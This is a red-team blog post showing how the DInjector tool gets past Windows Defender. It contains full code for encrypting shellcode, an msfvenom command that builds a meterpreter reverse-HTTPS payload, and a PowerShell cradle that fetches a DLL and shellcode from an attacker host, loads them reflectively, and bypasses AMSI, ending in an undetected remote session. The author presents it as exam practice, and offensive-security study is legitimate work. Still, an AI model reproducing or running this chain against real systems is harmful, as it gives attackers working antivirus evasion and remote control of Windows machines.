---
layout: single
title: "Trying out DInjector as a AV/EDR bypassing tool, fully ported to DInvoke APIs"
date: 2021-10-26
tags:  
  - windows
  - avbypass
  - dinvoke
  - windows-defender
author_profile: true
---

Hello back fellow red teamers. I decided to come make a blog post after a little of long period in which I lost all of my other blog posts.

Lately I have been focused on Windows stuff, such as excercises on trying to bypass Windows Defender through trial and errors etc as a practice to help me make some preparations for a possible OSEP attempt lol.

I came across some amazing repos which I though would be worth to explain on a blog.

First let's take a view :

- [https://github.com/TheWover/DInvoke](https://github.com/TheWover/DInvoke)
 
DInvoke is dynamic replacement for PInvoke and contains powerful primitives that can be combined to dynamically invoke unmanaged code from disk or from memory.

You can have this reference for a deeper explaination on what DInvoke does and what it really is : [https://thewover.github.io/Dynamic-Invoke/](https://thewover.github.io/Dynamic-Invoke/)

While desperatly googling about examples of DInvoke being used on an actual Proof of Concept for silent Code Execution I ended up finding this amazing tool which is fully ported on DInvoke APIs : [https://github.com/snovvcrash/DInjector](https://github.com/snovvcrash/DInjector)

```
(    (
     )\ ) )\ )                   )             (   (  (
    (()/((()/(     (    (     ( /(    (        )\ ))\ )\
     /(_))/(_))(   )\  ))\ (  )\())(  )(      (()/((_|(_)
    (_))_(_))  )\ |(_)/((_))\(_))/ )\(()\      ((_))  _
     |   \_ _|_(_/( !(_)) ((_) |_ ((_)((_)     _| | || |
     | |) | || ' \)) / -_) _||  _/ _ \ '_|  _/ _` | || |
     |___/___|_||_|/ \___\__| \__\___/_|   (_)__,_|_||_|
                 |__/-----------------------------------
                                                K E E P
                                                C A L M
                                                  A N D
                                       D / I N 💉 E C T
                                      S H E L L C O D E
```

The repo consists of a shellcode encrypter which makes use of `xor` or `aes` algorithms and encrypts the file with a password using sha256 and the DLL project which we will be loading into the memory to execute code.

- encrypter.py

```python
#!/usr/bin/env python3

import os
import hashlib
from base64 import b64encode
from argparse import ArgumentParser

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend


class AES:

	def __init__(self, password, iv): 
		self.key = hashlib.sha256(password.encode()).digest()
		self.iv = iv

	def encrypt(self, raw):
		backend = default_backend()
		padder = padding.PKCS7(128).padder()
		raw = padder.update(raw) + padder.finalize()
		cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=backend)
		encryptor = cipher.encryptor()
		return self.iv + encryptor.update(raw) + encryptor.finalize()


def parse_args():
	parser = ArgumentParser()
	parser.add_argument('shellcode_bin', action='store', type=str)
	parser.add_argument('-p', '--password', action='store', type=str, required=True)
	parser.add_argument('-a', '--algorithm', action='store', type=str, default='aes', choices=['aes', 'xor'])
	parser.add_argument('-o', '--output', action='store', type=str)
	parser.add_argument('--base64', action='store_true', default=False)
	return parser.parse_args()


if __name__ == '__main__':
	args = parse_args()

	with open(args.shellcode_bin, 'rb') as fd:
		shellcode = fd.read()

	if args.algorithm == 'aes':
		iv = os.urandom(16)
		ctx = AES(args.password, iv)
		enc = ctx.encrypt(shellcode)
	elif args.algorithm == 'xor':
		enc = bytearray(b ^ ord(args.password) for b in shellcode)

	if args.base64:
		print(b64encode(enc).decode())
	else:
		with open(args.output, 'wb') as fd:
			fd.write(enc)
		print(f'[+] Encrypted shellcode file: {args.output}')
```

I could use Visual Studio to compile the DLL project but doing everything in linux just fits in perfectly. I wasnt aware there was a developer tool such as ``monodeveloper`` which could handle `C#` and `.NET` compiling on linux.

![img1](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/DInjector1.png)

The walkthrough after compiling the DLL is pretty much straightforwards, I am going to create a meterpreter shellcode and have the output as raw : 

```bash
pi0x73@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=192.168.88.142 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 906 bytes
Saved as: shellcode.bin
```

Setting up a listener which will serve the DLL to be loaded and the shellcode : 

![img2](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img2.png)

Before executing let's make sure Windows Defender is up to date.

![img3](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img3.png)

To load the DLL into the memory and call the shellcode you might want to run cradle.ps1 if you dont want to do it manually...

```powershell
# MODULE
$M = "currentthread"

# LHOST
$H = "192.168.88.142"

# AMSI
$A = "true"

# DLL
$D = "DInjector.dll"

# SHELLCODE
$S = "enc"

# PASSWORD
$P = "hahaWOW!!encrypt"

# PROCESS
$N = "notepad"

# IMAGE
$I = "C:\Windows\System32\svchost.exe"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreadsuspended")
if ($methods.Contains($M)) {
    $N = (Start-Process -WindowStyle Hidden -PassThru $N).Id
}

$cmd = "$M /am51:$A /sc:http://$H/$S /password:$P /pid:$N /image:$I"

$data = (IWR -UseBasicParsing "http://$H/$D").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd.Split(" ")))
```

Clean execution , no trigger of the Antivirus and a functional meterpreter session!

![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img4.png)
